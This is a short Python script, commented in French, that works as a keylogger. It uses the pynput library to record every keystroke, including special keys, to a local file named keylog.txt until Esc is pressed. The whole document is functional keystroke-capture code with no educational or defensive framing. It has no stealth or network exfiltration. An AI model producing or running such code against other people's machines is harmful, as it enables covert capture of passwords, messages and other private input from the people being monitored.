import pynput.keyboard

log_file = "keylog.txt"  # Nom du fichier de journal

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        else:
            with open(log_file, "a") as f:
                f.write(" " + str(key) + " ")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

# Configuration du keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
